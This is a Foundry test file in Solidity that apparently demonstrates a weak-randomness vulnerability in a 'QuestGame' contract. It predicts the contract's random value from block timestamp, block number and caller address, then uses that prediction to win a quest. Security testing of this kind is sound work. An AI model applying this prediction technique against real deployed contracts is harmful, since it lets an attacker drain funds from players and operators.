
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import "../src/QuestGame.sol";

contract TestWeakRandomnessQuestGame is Test {

    QuestGame public _contractUnderTest;

    function setUp() public {
        vm.deal(address(this), 1 ether);
        _contractUnderTest = new QuestGame{value: 1 ether}();
    }

    function test_highlightPredictableRandomValue(uint256 blockTimestamp, uint256 blockNumber) public {
        vm.assume(blockTimestamp >= block.timestamp);
        vm.assume(blockNumber >= block.number);
        vm.assume(type(uint256).max - blockNumber >= blockTimestamp);

        vm.warp(blockTimestamp);
        vm.roll(blockNumber);

        uint256 seed = uint256(keccak256(abi.encodePacked(blockTimestamp, blockNumber, address(this))));
        uint256 expectedRandom = seed % 100;

        vm.deal(address(this), 0.1 ether);
        _contractUnderTest.attemptQuest{value: 0.1 ether}(expectedRandom);

        assertEq(_contractUnderTest.players(address(this)).wins(), 1, "Player should have won the quest");
    }
}
